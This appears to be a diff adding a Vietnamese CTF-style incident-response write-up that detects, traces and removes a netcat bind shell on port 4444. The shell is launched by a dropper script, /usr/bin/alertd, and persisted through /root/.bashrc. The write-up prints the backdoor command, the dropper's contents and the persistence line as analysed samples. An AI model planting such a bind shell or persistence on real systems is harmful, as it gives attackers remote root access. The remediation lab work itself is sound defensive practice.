@@ -159,4 +159,216 @@ rm /root/.ssh/authorized_keys (là một Issue)
 # Xóa script Python backdoor
 rm /lib/python3/dist-packages/initiate-pyshell
 ```
+**Issue 1 (Bind shell 4444 + persistence qua /root/.bashrc + dropper /usr/bin/alertd)**
+
+---
+
+## 1) Cách phát hiện (Detection)
+
+### 1.1. Nghi vấn có cổng lạ đang mở (listen)
+
+Trong container này thiếu `ss` nên không dùng được cách phổ biến:
+
+```bash
+ss -lntup
+```
+
+**Output:**
+
+```text
+-bash: ss: command not found
+```
+
+=> Dùng cách “low-level” đọc trực tiếp kernel procfs: **/proc/net/tcp** để tìm socket TCP đang **LISTEN** (`st = 0A`) rồi map ra **PID + command**.
+
+### 1.2. Liệt kê TCP LISTEN + PID/command giữ cổng
+
+Chạy (root):
+
+```bash
+for inode in $(awk 'NR>1 && $4=="0A"{print $10}' /proc/net/tcp | sort -u); do
+  hexport=$(awk -v ino="$inode" 'NR>1 && $4=="0A" && $10==ino {split($2,a,":"); print a[2]; exit}' /proc/net/tcp)
+  port=$((16#$hexport))
+  pid=$(
+    for p in /proc/[0-9]*; do
+      ls -l "$p/fd" 2>/dev/null | grep -q "socket:\[$inode\]" && echo "${p#/proc/}" && break
+    done
+  )
+  cmd=$(tr '\0' ' ' <"/proc/$pid/cmdline" 2>/dev/null)
+  printf "port=%-5s inode=%s pid=%s cmd=%s\n" "$port" "$inode" "${pid:-?}" "${cmd:-?}"
+done | sort -n -t= -k2
+```
+
+**Output (quan trọng):**
+
+```text
+port=22    inode=59202733 pid=15  cmd=sshd: /usr/sbin/sshd [listener] ...
+port=4444  inode=59178818 pid=62  cmd=nc -e /bin/bash -lnp 4444
+port=4444  inode=59196276 pid=108 cmd=nc -e /bin/bash -lnp 4444
+port=4444  inode=59209755 pid=52  cmd=nc -e /bin/bash -lnp 4444
+port=4444  inode=59233904 pid=194 cmd=nc -e /bin/bash -lnp 4444
+```
+
+✅ Kết luận phát hiện: có **nhiều tiến trình `nc -e /bin/bash` đang LISTEN port 4444** → cực kỳ bất thường.
+
+---
+
+## 2) Phân tích vì sao nguy hiểm (Impact / Risk)
+
+### 2.1. `nc -e /bin/bash -lnp 4444` là gì?
+
+* `-l` : listen (mở cổng chờ kết nối)
+* `-n` : không resolve DNS
+* `-p 4444` : cổng 4444
+* `-e /bin/bash` : **khi có ai kết nối vào cổng này, netcat sẽ spawn /bin/bash và nối stdin/stdout qua socket**
+
+=> Đây là **bind shell**. Ai kết nối tới `IP:4444` sẽ nhận được **shell**.
+
+### 2.2. Nguy cơ
+
+* Nếu process chạy với quyền **root** (thực tế là root) ⇒ attacker có **RCE root từ xa**.
+* Có thể:
+
+  * chạy lệnh tùy ý, cài malware/persistence khác,
+  * đọc flag, lấy dữ liệu, pivot sang hệ thống khác trong mạng CTF,
+  * phá máy hoặc che dấu dấu vết (log tampering).
+
+---
+
+## 3) Lần dấu xem ai spawn ra `nc` (Triage / Root cause)
+
+### 3.1. Xem PPID của các tiến trình `nc`
+
+Từ output ở bước 1.2, kiểm tra PPID:
+
+```bash
+ps -o pid,ppid,user,etime,cmd -p 52,62,108,194
+```
+
+**Output:**
+
+```text
+PID  PPID USER ELAPSED CMD
+52   50   root   17:30 nc -e /bin/bash -lnp 4444
+62   60   root   17:09 nc -e /bin/bash -lnp 4444
+108  106  root   14:18 nc -e /bin/bash -lnp 4444
+194  192  root   02:22 nc -e /bin/bash -lnp 4444
+```
+
+### 3.2. Xem “process cha” (PPID) là gì
+
+```bash
+ps -o pid,ppid,user,etime,cmd -p 50,60,106,192
+```
+
+**Output:**
+
+```text
+PID  PPID USER ELAPSED CMD
+50   1    root  20:54 /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
+60   1    root  20:33 /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
+106  102  root  17:42 /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
+192  188  root  05:46 /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
+```
+
+✅ Kết luận: `nc` được spawn bởi `/usr/bin/alertd` (chạy qua `/bin/bash`).
+
+---
+
+## 4) Phân tích backdoor file `/usr/bin/alertd`
+
+```bash
+ls -la /usr/bin/alertd
+/bin/sed -n '1,160p' /usr/bin/alertd
+```
+
+**Output:**
+
+```text
+-rwxr-xr-x 1 root root 38 Feb 27 06:11 /usr/bin/alertd
+#!/bin/bash
+nc -e /bin/bash -lnp 4444
+```
+
+✅ `alertd` là script siêu ngắn, chỉ có nhiệm vụ **mở bind shell 4444**.
+
+---
+
+## 5) Tìm persistence: cái gì auto-run `alertd`?
+
+Quét các file chạy khi login/mở shell (profile/bashrc):
+
+```bash
+/bin/grep -RIn "alertd" \
+  /etc/profile /etc/bash.bashrc /etc/profile.d \
+  /root/.bashrc /root/.profile \
+  /home/bksec/.bashrc /home/bksec/.profile \
+  2>/dev/null
+```
+
+**Output:**
+
+```text
+/root/.bashrc:102:alertd -e /bin/bash -lnp 4444 &>/dev/null &
+```
+
+✅ Persistence nằm trong **/root/.bashrc**: mỗi lần root mở shell là backdoor lại chạy (vì chạy nền + redirect /dev/null nên khó thấy).
+
+---
+
+## 6) Cách giải quyết (Remediation) — chi tiết, dễ hiểu
+
+### 6.1. Gỡ persistence trong `/root/.bashrc`
+
+> Mục tiêu: “chặt nguồn”, để backdoor không tự mọc lại.
+
+```bash
+cp /root/.bashrc /root/.bashrc.bak_fix
+sed -i '/alertd .*4444/d' /root/.bashrc
+grep -n "alertd" /root/.bashrc || echo "OK: no alertd in /root/.bashrc"
+```
+
+**Output:**
+
+```text
+OK: no alertd in /root/.bashrc
+```
+
+### 6.2. Kill các tiến trình backdoor đang chạy + xóa dropper `/usr/bin/alertd`
+
+> Mục tiêu: dọn sạch trạng thái đang listen 4444 + xóa file backdoor.
+
+```bash
+ps -eo pid,ppid,user,cmd | grep -E 'nc -e /bin/bash -lnp 4444|/usr/bin/alertd' | grep -v grep
+
+pids=$(ps -eo pid,cmd | awk '/nc -e \/bin\/bash -lnp 4444|\/usr\/bin\/alertd/ {print $1}')
+[ -n "$pids" ] && kill -9 $pids
+
+/bin/rm -f /usr/bin/alertd
+```
+
+**Output tiêu biểu (trước khi kill):**
+
+```text
+50  1 root /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
+52 50 root nc -e /bin/bash -lnp 4444
+...
+```
+
+### 6.3. Xác nhận Issue 1 đã được fix bằng checker
+
+```bash
+/root/solveme
+```
+
+**Output (đoạn liên quan):**
+
+```text
+Issue 1 is fully remediated
+...
+Keep looking! 5/7 issues fixed.
+```
+
+---
+
 
